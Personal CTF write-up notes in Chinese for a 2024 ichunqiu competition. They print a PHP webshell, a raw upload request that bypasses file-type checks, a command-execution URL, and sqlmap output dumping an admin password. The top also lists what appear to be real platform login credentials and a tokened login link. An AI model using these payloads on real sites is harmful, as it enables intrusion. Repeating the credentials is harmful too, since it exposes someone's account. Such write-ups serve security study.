账号密码：
![[83b1b03d231b64f691ed7ba0098018f0.png]]
19380156166
SqfhWWMB
网址：
https://match.ichunqiu.com/2024qwqsnsj

https://match.ichunqiu.com/login?k=ATRSYlppUzMHcAQnUSZcfgU9BnEAOwsyA2UEPV5pCjlSYAI0Wm9RMAYzBmE

## Web
### fileup
在 `2.txt` 文件中写入 php 一句话木马。
```2.txt
<?php system($_GET['cmd']);?>
```

选择 `2.txt` 上传，使用 burp 抓包，将 `2.txt`  改成 `2.php` 绕过前端验证。

payload:
```http
POST /upload.php HTTP/1.1
Host: eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com
Content-Length: 210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytmLUMzo4BSnxuEhQ
Accept: */*
Origin: http://eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com
Referer: http://eci-2zefomy0ikzauba54fm0.cloudeci1.ichunqiu.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1732960958,1733317540,1733380272,1733561121
Connection: keep-alive

------WebKitFormBoundarytmLUMzo4BSnxuEhQ
Content-Disposition: form-data; name="file"; filename="2.php"
Content-Type: text/plain

  <?php system($_GET['cmd']);?>
------WebKitFormBoundarytmLUMzo4BSnxuEhQ--
```

响应文：
```
{"success":true,"message":"\u6587\u4ef6\u4e0a\u4f20\u6210\u529f","filePath":"uploads/6754e1a2b3f68_2.php"}
```

然后 rce 即可获得 flag
```
http://.../uploads/6754e1a2b3f68_2.php?cmd=cat /flag
```

```
flag{61ecb4e6-aa15-4813-ac4d-b33cd720251d}
```


index.html upload.php uploads

index.html
```

```

### xmlsystem

home.php index.php db.php upload.php

sql 注入
```http
POST /index.php HTTP/1.1
Host: eci-2zecc5jyh9rv6zaa2hx5.cloudeci1.ichunqiu.com
Content-Length: 29
Cache-Control: max-age=0
Origin: http://eci-2zecc5jyh9rv6zaa2hx5.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zecc5jyh9rv6zaa2hx5.cloudeci1.ichunqiu.com/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1732960958,1733317540,1733380272,1733561121; PHPSESSID=eb2facd8b6d7275577f44b8fffe64780
Connection: keep-alive

username=admin&password=admin
```

sqlmap

```
[*] ctf
[*] information_schema
[*] mysql
[*] performance_schema
```

```
+-------+
| users |
+-------+
```

```
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

```
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | adminPasswd@123!! | admin    |
+----+-------------------+----------+
```